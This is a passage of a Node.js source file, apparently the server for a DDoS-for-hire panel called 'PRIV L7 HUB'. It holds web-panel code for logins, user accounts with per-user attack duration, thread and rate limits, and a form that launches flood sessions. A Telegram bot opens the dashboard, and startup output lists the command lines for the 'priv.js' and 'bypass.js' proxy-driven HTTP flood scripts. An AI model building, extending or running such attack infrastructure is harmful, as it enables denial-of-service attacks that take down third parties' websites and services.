'payload.query=($("#querySelect")&&$("#querySelect").value)||"0";',
'payload.delay=Number(($("#delayInput")&&$("#delayInput").value)||0);',
'payload.limit=!!($("#limitInput")&&$("#limitInput").checked);',
'}',
'if(btn){btn.disabled=true;btn.querySelector("span").textContent="...";}',
'try{',
'var res=await api("/api/sessions",{',
'method:"POST",',
'body:JSON.stringify(payload)',
'});',
'showToast("Process started: "+res.session.method);',
'loadSessions();',
'}catch(ex){',
'if(err)err.textContent=ex.message;',
'showToast("Error: "+ex.message);',
'}finally{',
'if(btn){btn.disabled=false;btn.querySelector("span").textContent="\\u2197";}',
'}',
'}',
'function setLoginBusy(busy){',
'var btn=$("#loginBtn");if(!btn)return;',
'var label=btn.querySelector(".btn-label");',
'var dots=btn.querySelector(".btn-dots");',
'var arrow=btn.querySelector(".btn-arrow");',
'btn.disabled=!!busy;',
'if(busy){',
'if(label)label.classList.add("hide");',
'if(arrow)arrow.classList.add("hide");',
'if(dots)dots.classList.remove("hide");',
'}else{',
'if(label)label.classList.remove("hide");',
'if(arrow)arrow.classList.remove("hide");',
'if(dots)dots.classList.add("hide");',
'}',
'}',
'function bindEvents(){',
'var lf=$("#loginForm");',
'if(lf)lf.addEventListener("submit",async function(e){',
'e.preventDefault();',
'var err=$("#loginErr");if(err)err.textContent="";',
'var uEl=e.target.querySelector(\'[name="username"]\');',
'var pEl=e.target.querySelector(\'[name="password"]\');',
'setLoginBusy(true);',
'try{',
'var data=await api("/api/login",{',
'method:"POST",',
'body:JSON.stringify({username:uEl.value,password:pEl.value})',
'});',
'currentUser=data.user;',
'updateRoleDisplay();',
'showApp();',
'applyUserLimits();',
'}catch(ex){if(err)err.textContent=ex.message;}',
'finally{setLoginBusy(false);}',
'});',
'var lo=$("#logout");',
'if(lo)lo.addEventListener("click",async function(){',
'try{await api("/api/logout",{method:"POST"});}catch(e){}',
'showLogin();',
'});',
'var mn=$("#menu");',
'if(mn)mn.addEventListener("click",function(){drawer.classList.toggle("hide");});',
'drawer.querySelectorAll("button[data-page]").forEach(function(btn){',
'btn.addEventListener("click",function(){setPage(btn.dataset.page);});',
'});',
'$$("#bottomNav button").forEach(function(btn){',
'btn.addEventListener("click",function(){setPage(btn.dataset.page);});',
'});',
'var ms=$("#methodSelect");',
'if(ms)ms.addEventListener("change",function(){updateMethodFields();updateCmdPreview();});',
'var launchForm=$("#launch");',
'if(launchForm){',
'launchForm.addEventListener("input",updateCmdPreview);',
'launchForm.addEventListener("change",updateCmdPreview);',
'launchForm.addEventListener("submit",startProcess);',
'}',
'var rf=$("#refresh");',
'if(rf)rf.addEventListener("click",loadSessions);',
'var ac=$("#account");',
'if(ac)ac.addEventListener("submit",async function(e){',
'e.preventDefault();',
'var msg=$("#accountMsg");if(msg)msg.textContent="";',
'var fd=new FormData(e.target);',
'try{',
'var data=await api("/api/account",{',
'method:"POST",',
'body:JSON.stringify({',
'currentPassword:fd.get("currentPassword"),',
'newUsername:fd.get("newUsername")||undefined,',
'newPassword:fd.get("newPassword")||undefined',
'})',
'});',
'currentUser=data.user;updateRoleDisplay();applyUserLimits();',
'if(msg)msg.textContent="Saved.";',
'showToast("Account updated");',
'}catch(ex){if(msg)msg.textContent=ex.message;}',
'});',
'var cu=$("#createUser");',
'if(cu)cu.addEventListener("submit",async function(e){',
'e.preventDefault();',
'var msg=$("#userMsg");if(msg)msg.textContent="";',
'var fd=new FormData(e.target);',
'try{',
'await api("/api/users",{',
'method:"POST",',
'body:JSON.stringify({',
'username:fd.get("username"),',
'password:fd.get("password"),',
'maxDuration:Number(fd.get("maxDuration")||0),',
'maxThreads:Number(fd.get("maxThreads")||0),',
'maxRate:Number(fd.get("maxRate")||0),',
'maxConcurrent:Number(fd.get("maxConcurrent")||0)',
'})',
'});',
'if(msg){msg.className="ok";msg.textContent="User created.";}',
'showToast("User created");',
'e.target.reset();loadUsers();',
'}catch(ex){if(msg){msg.className="err";msg.textContent=ex.message;}}',
'});',
'var ab=$("#addBlacklist");',
'if(ab)ab.addEventListener("submit",async function(e){',
'e.preventDefault();',
'var msg=$("#blacklistMsg");if(msg)msg.textContent="";',
'var fd=new FormData(e.target);',
'try{',
'await api("/api/blacklist",{',
'method:"POST",',
'body:JSON.stringify({pattern:fd.get("pattern")})',
'});',
'if(msg){msg.className="ok";msg.textContent="Added.";}',
'showToast("Blacklist updated");',
'e.target.reset();loadBlacklist();',
'}catch(ex){if(msg){msg.className="err";msg.textContent=ex.message;}}',
'});',
'}',
'function bootApp(){',
'bindEvents();',
'updateMethodFields();',
'updateCmdPreview();',
'checkAuth();',
'}',
'})();'
].join('\n');

app.get('/', function (_req, res) { res.type('html').send(HTML); });
app.get('/ui.js', function (_req, res) { res.type('application/javascript').send(UI_JS); });
app.get('/ui.css', function (_req, res) { res.type('text/css').send(UI_CSS); });

app.use(function (err, _req, res, _next) {
  console.error(err);
  res.status(500).json({ error: 'Internal server error.' });
});

/* ---------- TELEGRAM BOT ---------- */
let bot = null;
try {
  const TelegramBot = require('node-telegram-bot-api');
  if (CONFIG.botToken) {
    bot = new TelegramBot(CONFIG.botToken, { polling: true });
    bot.onText(/\/start/, async function (msg) {
      const chatId = msg.chat.id;
      const appUrl = CONFIG.miniAppUrl;
      const text = 'Welcome to PrivHub!\n\nTap below to open your dashboard.';
      const keyboard = {
        inline_keyboard: [
          [{ text: '🚀 Open L7 Hub', web_app: { url: appUrl } }]
        ]
      };
      try { await bot.sendMessage(chatId, text, { reply_markup: keyboard }); }
      catch (e) { console.error('[bot] sendMessage failed:', e.message); }
    });
    bot.on('polling_error', function (e) { console.error('[bot] polling error:', e.message); });
    console.log('[bot] Telegram bot started (polling).');
  } else {
    console.log('[bot] BOT_TOKEN not set - Telegram bot disabled.');
  }
} catch (e) {
  console.log('[bot] node-telegram-bot-api not installed - bot disabled.');
}

/* ---------- START ---------- */
const server = app.listen(CONFIG.port, CONFIG.host, function () {
  console.log('');
  console.log('  PRIV L7 HUB    ->  http://' + CONFIG.host + ':' + CONFIG.port);
  console.log('  Mini App URL   ->  ' + CONFIG.miniAppUrl);
  console.log('  Contact        ->  t.me/privflood');
  console.log('  Script folder  ->  ' + SCRIPT_DIR);
  const methods = getMethods();
  console.log('  Methods        ->  ' + (methods.length ? methods.map(function (m) { return m.name; }).join(', ') : '(none found)'));
  const proxyPath = path.join(SCRIPT_DIR, 'proxy.txt');
  console.log('  Proxy file     ->  proxy.txt' + (fs.existsSync(proxyPath) ? ' (found)' : ' (MISSING)'));
  console.log('  Cookie secure  ->  ' + (CONFIG.cookieSecure ? 'yes (SameSite=None)' : 'no (SameSite=Lax)'));
  console.log('  Min password   ->  ' + CONFIG.minPasswordLength + ' characters');
  console.log('  Admin          ->  unlimited duration / threads / rate / concurrent');
  console.log('  Users          ->  per-user limits (0 = unlimited)');
  console.log('');
  console.log('  Commands:');
  METHODS.forEach(function (m) {
    if (m.id === 'priv') {
      console.log('    priv    ->  node priv.js <target> <duration> proxy.txt <threads> <rate> -c -h');
    } else if (m.id === 'bypass') {
      console.log('    bypass  ->  node bypass.js <GET|POST> <target> <duration> <threads> <rate> proxy.txt [--query 1|2|3] [--limit true] [--delay N]');
    }
  });
  console.log('');
});

function shutdown(sig) {
  console.log('\n[hub] ' + sig + ' received, shutting down...');
  for (const entry of sessions.values()) {
    try { killTree(entry.child, 'SIGKILL'); } catch (e) {}
  }
  sessions.clear();
  if (bot) { try { bot.stopPolling(); } catch (e) {} }
  server.close(function () { process.exit(0); });
  setTimeout(function () { process.exit(0); }, 2000).unref();
}
process.on('SIGINT', function () { shutdown('SIGINT'); });
process.on('SIGTERM', function () { shutdown('SIGTERM'); });
